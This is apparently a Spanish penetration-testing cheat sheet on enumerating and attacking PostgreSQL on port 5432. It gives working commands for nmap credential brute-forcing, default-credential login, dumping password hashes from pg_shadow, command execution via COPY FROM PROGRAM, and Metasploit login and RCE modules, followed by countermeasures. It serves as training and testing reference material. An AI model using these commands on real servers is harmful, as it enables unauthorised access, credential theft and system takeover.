---
title: Enumeración PostgreSQL (Puerto 5432)
slug: enumeracion-postgresql
aliases: [Enumeración PostgreSQL (Puerto 5432)]
fase: [Enumeración]
plataforma: Multi
dificultad: Intermedia
mitre: [T1046]
related: []
learning_refs: []
---

# Enumeración PostgreSQL (Puerto 5432)

## Descripción
PostgreSQL es un sistema de gestión de bases de datos relacionales (RDBMS) de código abierto y potente. La enumeración de PostgreSQL se centra en descubrir la versión del servidor, bases de datos existentes, usuarios, roles, y lo más importante, intentar el acceso mediante credenciales por defecto o ataques de fuerza bruta. Si se logra el acceso con privilegios de superusuario (postgres), es posible lograr la ejecución de comandos en el sistema operativo subyacente (RCE).

## Herramientas
- **nmap** — escaneo de puertos y scripts NSE especializados (pgsql-brute, pgsql-info)
- **psql** — cliente interactivo oficial de PostgreSQL
- **Metasploit** — módulos auxiliares para escaneo, fuerza bruta y ejecución de comandos
- **sqlmap** — automatización de inyección SQL y toma de control de BD

## Comandos / Ejemplos

### Escaneo inicial con Nmap
```bash
# Detección de versión y scripts básicos
nmap -p 5432 -sV --script pgsql-info 10.10.10.10

# Fuerza bruta de credenciales (usando SecLists)
nmap -p 5432 --script pgsql-brute --script-args userdb=/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/wordlists/seclists/Passwords/Common-Credentials/top-20-common-passwords.txt 10.10.10.10
```

### Acceso con psql (Credenciales por defecto: postgres/postgres)
```bash
# Conexión directa
psql -h 10.10.10.10 -U postgres

# Listar bases de datos una vez conectado
postgres=# \l

# Listar tablas
postgres=# \dt

# Consultar usuarios y roles
postgres=# SELECT usename, passwd FROM pg_shadow;
```

### Ejecución de Comandos (RCE)
Si se tiene acceso como superusuario, se puede utilizar la funcionalidad de `COPY FROM PROGRAM`:
```sql
-- Crear tabla temporal para recibir la salida
CREATE TABLE shell(output text);

-- Ejecutar comando (ej: id)
COPY shell FROM PROGRAM 'id';

-- Ver resultado
SELECT * FROM shell;

-- Limpiar
DROP TABLE shell;
```

### Metasploit modules
```bash
msfconsole -q
use auxiliary/scanner/postgres/postgres_login
set RHOSTS 10.10.10.10
run

# Si se tienen credenciales, ejecutar comandos
use exploit/multi/postgres/postgres_copy_from_program_rce
set RHOSTS 10.10.10.10
set USERNAME postgres
set PASSWORD postgres
run
```

## Contramedidas
- **Deshabilitar el acceso remoto** si no es estrictamente necesario o limitarlo mediante el archivo `pg_hba.conf` a IPs específicas.
- **Cambiar las contraseñas por defecto** de la cuenta `postgres`.
- **Implementar autenticación fuerte** (ej. SCRAM-SHA-256) en lugar de `md5` o `trust`.
- **Restringir los permisos de ejecución** de funciones peligrosas como `COPY FROM PROGRAM`.
- **Mantener el servidor actualizado** para parchear vulnerabilidades conocidas de desbordamiento de búfer o elevación de privilegios.

## Referencias
- PostgreSQL Documentation. (2024). PostgreSQL 16.0 Documentation. https://www.postgresql.org/docs/
- HackTricks. (2024). 5432 - Pentesting PostgreSQL. https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
- SecLists: /usr/share/wordlists/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking: The Ethical Hacker's Handbook* (5th ed.). McGraw-Hill Education.
